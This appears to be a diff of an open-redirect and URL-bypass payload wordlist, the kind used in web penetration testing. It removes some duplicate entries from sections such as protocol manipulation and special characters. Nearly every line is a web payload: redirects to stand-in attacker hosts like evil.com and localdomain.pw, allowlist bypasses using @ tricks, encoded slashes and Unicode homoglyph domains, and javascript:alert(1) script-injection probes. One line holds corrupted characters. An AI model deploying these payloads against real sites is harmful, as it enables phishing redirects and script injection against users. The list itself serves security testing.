@@ -43,8 +43,6 @@ https://evil.com/
 ?logout=http://evil.com
 
 ## Protocol Manipulation
-///evil.com
-////evil.com
 /////evil.com
 \\evil.com
 \\\\evil.com
@@ -137,7 +135,6 @@ http://legitimate.com#@evil.com
 ## Bypass with Partial URL
 evil.com
 //evil.com
-///evil.com
 
 ## Using Different TLDs
 http://evil.co
@@ -172,7 +169,6 @@ http://evil.com%3Flegitimate.com
 ## Special Characters
 http://evil。com (using Unicode dot)
 http://evil。com (using full-width dot)
-http://evil%E3%80%82com
 
 ## Bypass with URL Fragments
 #http://evil.com
@@ -283,14 +279,8 @@ https:///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
 //www.whitelisteddomain.tld@https:///localdomain.pw/%2e%2e
 /https://localdomain.pw/%2e%2e
 /https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e
-///localdomain.pw/%2f%2e%2e
-///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
-////localdomain.pw/%2f%2e%2e
-////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
 https:///localdomain.pw/%2f%2e%2e
 https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
-/https://localdomain.pw/%2f%2e%2e
-/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
 /https:///localdomain.pw/%2f%2e%2e
 /https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
 /%09/localdomain.pw
@@ -318,7 +308,6 @@ https://%5cwww.whitelisteddomain.tld@localdomain.pw
 https://localdomain.pw
 https://www.whitelisteddomain.tld@localdomain.pw
 javascript:alert(1);
-javascript:alert(1)
 //javascript:alert(1);
 /javascript:alert(1);
 //javascript:alert(1)
@@ -612,14 +601,9 @@ https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐ�
 //www.whitelisteddomain.tld@https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 /https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 /https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 /https://Ⓛ𝐨𝗰𝐀��ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 /https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 /https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 /%09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
